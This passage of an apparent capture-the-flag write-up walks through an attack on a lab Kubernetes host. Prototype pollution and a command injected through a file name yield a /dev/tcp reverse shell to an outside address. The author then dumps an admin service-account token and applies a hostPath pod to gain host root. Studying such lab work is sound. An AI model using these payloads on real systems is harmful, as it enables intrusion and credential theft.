<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">curl -i http://172.17.0.6:3000
&lt; HTTP/1.1 <span style="color:#bd93f9">200</span> OK
&lt; X-Powered-By: Express
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
<span style="color:#ff79c6">[]</span>
</code></pre></td></tr></table>
</div>
</div><p>We can try the same prototype pollution as earlier:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">curl -X PUT http://172.17.0.8:3000/ -H <span style="color:#f1fa8c">&#39;Content-Type: application/json&#39;</span> -d <span style="color:#f1fa8c">&#39;{&#34;auth&#34;: {&#34;name&#34;: &#34;felamos&#34;, &#34;password&#34;: &#34;Winter2021&#34;}, &#34;message&#34;: {&#34;test&#34;: &#34;something&#34;, &#34;__proto__&#34;: {&#34;canUpload&#34;: true}}}&#39;</span>
curl -X POST http://172.17.0.8:3000/upload -H <span style="color:#f1fa8c">&#39;Content-Type: application/json&#39;</span> -d <span style="color:#f1fa8c">&#39;{&#34;auth&#34;: {&#34;name&#34;: &#34;felamos&#34;, &#34;password&#34;: &#34;Winter2021&#34;}, &#34;filename&#34;: &#34;x; ping -c 1 10.10.14.15&#34;}&#39;</span>
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
sudo tcpdump -i utun0 icmp
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
17:00:40.137779 IP 10.10.10.235 &gt; 10.10.14.15: ICMP <span style="color:#8be9fd;font-style:italic">echo</span> request, id 14, seq 1, length <span style="color:#bd93f9">64</span>
17:00:40.137816 IP 10.10.14.15 &gt; 10.10.10.235: ICMP <span style="color:#8be9fd;font-style:italic">echo</span> reply, id 14, seq 1, length <span style="color:#bd93f9">64</span>
</code></pre></td></tr></table>
</div>
</div><p>getting a reverse shell:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#6272a4"># prototype pollution</span>
curl -X PUT http://172.17.0.8:3000/ -H <span style="color:#f1fa8c">&#39;Content-Type: application/json&#39;</span> -d <span style="color:#f1fa8c">&#39;{&#34;auth&#34;: {&#34;name&#34;: &#34;felamos&#34;, &#34;password&#34;: &#34;Winter2021&#34;}, &#34;message&#34;: {&#34;test&#34;: &#34;something&#34;, &#34;__proto__&#34;: {&#34;canUpload&#34;: true}}}&#39;</span>
<span style="color:#6272a4"># revers shell</span>
curl -X POST http://172.17.0.8:3000/upload -H <span style="color:#f1fa8c">&#39;Content-Type: application/json&#39;</span> -d <span style="color:#f1fa8c">&#39;{&#34;auth&#34;: {&#34;name&#34;: &#34;felamos&#34;, &#34;password&#34;: &#34;Winter2021&#34;}, &#34;filename&#34;: &#34;x; bash -c \&#34;bash &gt;&amp; /dev/tcp/10.10.14.15/443 0&gt;&amp;1\&#34;&#34;}&#39;</span>
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
nc -lnvp <span style="color:#bd93f9">443</span>
Listening on 0.0.0.0 <span style="color:#bd93f9">443</span>
python -c <span style="color:#f1fa8c">&#34;import pty; pty.spawn(&#39;bash&#39;)&#34;</span>
root@devnode-deployment-cd86fb5c-qlxww:/usr/src/app# ^Z
<span style="color:#ff79c6">[</span>1<span style="color:#ff79c6">]</span>  + <span style="color:#bd93f9">63964</span> suspended  nc -lnvp <span style="color:#bd93f9">443</span>
_  www stty raw -echo; <span style="color:#8be9fd;font-style:italic">fg</span>
<span style="color:#ff79c6">[</span>1<span style="color:#ff79c6">]</span>  + <span style="color:#bd93f9">63964</span> continued  nc -lnvp <span style="color:#bd93f9">443</span>
                                    reset
reset: unknown terminal <span style="color:#8be9fd;font-style:italic">type</span> unknown
Terminal type? screen
root@devnode-deployment-cd86fb5c-qlxww:/usr/src/app# hostname
devnode-deployment-cd86fb5c-qlxww
</code></pre></td></tr></table>
</div>
</div><p>Namespace is <code>cat /run/secrets/kubernetes.io/serviceaccount/namespace</code> : <code>dev</code></p>
<p>We upload <code>kubectl</code> and perform some kubernetes exploration:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">root@devnode-deployment-cd86fb5c-qlxww:/tmp# ./kubectl auth can-i --list
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
root@devnode-deployment-cd86fb5c-qlxww:/tmp# ./kubectl auth can-i --list -n kube-system
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   <span style="color:#ff79c6">[]</span>                                    <span style="color:#ff79c6">[]</span>               <span style="color:#ff79c6">[</span>create<span style="color:#ff79c6">]</span>
selfsubjectrulesreviews.authorization.k8s.io    <span style="color:#ff79c6">[]</span>                                    <span style="color:#ff79c6">[]</span>               <span style="color:#ff79c6">[</span>create<span style="color:#ff79c6">]</span>
secrets                                         <span style="color:#ff79c6">[]</span>                                    <span style="color:#ff79c6">[]</span>               <span style="color:#ff79c6">[</span>get list<span style="color:#ff79c6">]</span>
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
</code></pre></td></tr></table>
</div>
</div><p>We can explore the <code>secrets</code> resources and find interesting admin-token</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">root@devnode-deployment-cd86fb5c-qlxww:/tmp# ./kubectl get secrets -n kube-system
NAME                                             TYPE                                  DATA   AGE
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
c-admin-token-tfmp2                              kubernetes.io/service-account-token   <span style="color:#bd93f9">3</span>      236d
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
root@devnode-deployment-cd86fb5c-qlxww:/tmp# ./kubectl describe secret c-admin-token-tfmp2 -n kube-system
Name:         c-admin-token-tfmp2
Namespace:    kube-system
Labels:       &lt;none&gt;
Annotations:  kubernetes.io/service-account.name: c-admin
              kubernetes.io/service-account.uid: 2463505f-983e-45bd-91f7-cd59bfe066d0

Type:  kubernetes.io/service-account-token

<span style="color:#8be9fd;font-style:italic">Data</span>
<span style="color:#ff79c6">====</span>
ca.crt:     <span style="color:#bd93f9">1066</span> bytes
namespace:  <span style="color:#bd93f9">11</span> bytes
token:      eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow
</code></pre></td></tr></table>
</div>
</div><h1 id="cluster-takeover---api-as-admin">Cluster takeover - API as Admin</h1>
<p>The first line below means I have Full access to everything in the cluster:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">./kubectl auth can-i --list --token <span style="color:#ff79c6">$(</span>cat admin-token<span style="color:#ff79c6">)</span>
Resources                                       Non-Resource URLs                     Resource Names   Verbs
*.*                                             <span style="color:#ff79c6">[]</span>                                    <span style="color:#ff79c6">[]</span>               <span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span>
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
</code></pre></td></tr></table>
</div>
</div><p>As an example, I can list pods from every namespaces:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">./kubectl get pods --token <span style="color:#ff79c6">$(</span>cat admin-token<span style="color:#ff79c6">)</span> --all-namespaces
NAMESPACE     NAME                                  READY   STATUS             RESTARTS   AGE
default       webapp-deployment-5d764566f4-h5zhw    1/1     Running            <span style="color:#bd93f9">9</span>          207d
default       webapp-deployment-5d764566f4-lrpt9    1/1     Running            <span style="color:#bd93f9">9</span>          207d
default       webapp-deployment-5d764566f4-mbprj    1/1     Running            <span style="color:#bd93f9">9</span>          207d
dev           devnode-deployment-cd86fb5c-6ms8d     1/1     Running            <span style="color:#bd93f9">30</span>         236d
dev           devnode-deployment-cd86fb5c-mvrfz     1/1     Running            <span style="color:#bd93f9">31</span>         236d
dev           devnode-deployment-cd86fb5c-qlxww     1/1     Running            <span style="color:#bd93f9">31</span>         236d
kube-system   backup-pod                            0/1     CrashLoopBackOff   <span style="color:#bd93f9">412</span>        235d
kube-system   coredns-74ff55c5b-sclll               1/1     Running            <span style="color:#bd93f9">33</span>         237d
kube-system   etcd-unobtainium                      1/1     Running            <span style="color:#bd93f9">3</span>          46d
kube-system   kube-apiserver-unobtainium            1/1     Running            <span style="color:#bd93f9">3</span>          46d
kube-system   kube-controller-manager-unobtainium   1/1     Running            <span style="color:#bd93f9">37</span>         237d
kube-system   kube-proxy-zqp45                      1/1     Running            <span style="color:#bd93f9">33</span>         237d
kube-system   kube-scheduler-unobtainium            1/1     Running            <span style="color:#bd93f9">34</span>         237d
kube-system   storage-provisioner                   1/1     Running            <span style="color:#bd93f9">67</span>         237d
</code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s loop over all images availble from running pods:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">./kubectl get pods --token <span style="color:#ff79c6">$(</span>cat admin-token<span style="color:#ff79c6">)</span> --all-namespaces | grep -v NAMESPACE <span style="color:#f1fa8c">\
</span><span style="color:#f1fa8c"></span>| <span style="color:#ff79c6">while</span> <span style="color:#8be9fd;font-style:italic">read</span> line; <span style="color:#ff79c6">do</span>
	<span style="color:#8be9fd;font-style:italic">ns</span><span style="color:#ff79c6">=</span><span style="color:#ff79c6">$(</span><span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#8be9fd;font-style:italic">$line</span> | awk <span style="color:#f1fa8c">&#39;{print $1}&#39;</span><span style="color:#ff79c6">)</span>;
	<span style="color:#8be9fd;font-style:italic">name</span><span style="color:#ff79c6">=</span><span style="color:#ff79c6">$(</span><span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#8be9fd;font-style:italic">$line</span> | awk <span style="color:#f1fa8c">&#39;{print $2}&#39;</span><span style="color:#ff79c6">)</span>;
	./kubectl get pod <span style="color:#ff79c6">$(</span>name<span style="color:#ff79c6">)</span> -n <span style="color:#f1fa8c">${</span><span style="color:#8be9fd;font-style:italic">ns</span><span style="color:#f1fa8c">}</span> -o yaml --token <span style="color:#ff79c6">$(</span>cat admin-token<span style="color:#ff79c6">)</span> | grep <span style="color:#f1fa8c">&#34; - image:&#34;</span>
<span style="color:#ff79c6">done</span>
| sort -u
</code></pre></td></tr></table>
</div>
</div><p>Two images stands out: - image: localhost:5000/node_server - image: localhost:5000/dev-alpine</p>
<h1 id="host-takeover-through-malicious-pod">Host takeover through malicious pod</h1>
<p>The idea is to spin-up a malicious container having host filesystem mounted, and then explore or modify the host filesystem to get a shell.</p>
<p>the container stays alive only until it finishes to execute its command; so we better execute a command or a service that never ends, such as:</p>
<ul>
<li><code>sleep 300000</code></li>
<li><code>tail -f /dev/null</code></li>
<li>starts a nodejs server with the node_server image</li>
</ul>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-malicious-pod.yaml" data-lang="malicious-pod.yaml"><span style="color:#ff79c6">apiVersion</span>: v1
<span style="color:#ff79c6">kind</span>: Pod
<span style="color:#ff79c6">metadata</span>:
  <span style="color:#ff79c6">name</span>: evil-alpine
  <span style="color:#ff79c6">namespace</span>: kube-system
<span style="color:#ff79c6">spec</span>:
  <span style="color:#ff79c6">containers</span>:
  - <span style="color:#ff79c6">name</span>: evil-alpine
    <span style="color:#ff79c6">image</span>: localhost:5000/dev-alpine
    <span style="color:#ff79c6">command</span>: [<span style="color:#f1fa8c">&#34;/bin/sh&#34;</span>]
    <span style="color:#ff79c6">args</span>: [<span style="color:#f1fa8c">&#34;-c&#34;</span>, <span style="color:#f1fa8c">&#34;sleep 300000&#34;</span>]
    <span style="color:#ff79c6">volumeMounts</span>:
    - <span style="color:#ff79c6">mountPath</span>: /mnt
      <span style="color:#ff79c6">name</span>: hostfs
  <span style="color:#ff79c6">volumes</span>:
  - <span style="color:#ff79c6">name</span>: hostfs
    <span style="color:#ff79c6">hostPath</span>:
      <span style="color:#ff79c6">path</span>: /
  <span style="color:#ff79c6">automountServiceAccountToken</span>: <span style="color:#ff79c6">true</span>
  <span style="color:#ff79c6">hostNetwork</span>: <span style="color:#ff79c6">true</span>
</code></pre></td></tr></table>
</div>
</div><p>start the container with the apply command; and get a shell:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">./kubectl apply -f malicious-pod.yaml --token <span style="color:#ff79c6">$(</span>cat admin-token<span style="color:#ff79c6">)</span>
<span style="color:#6272a4">#./kubectl get pod alpine -n kube-system -o yaml --token $(cat admin-token)</span>
./kubectl <span style="color:#8be9fd;font-style:italic">exec</span> alpine --stdin --tty -n kube-system --token <span style="color:#ff79c6">$(</span>cat admin-token<span style="color:#ff79c6">)</span> -- whoami
root
</code></pre></td></tr></table>
</div>
</div><h1 id="upload-ssh-key">upload ssh key</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
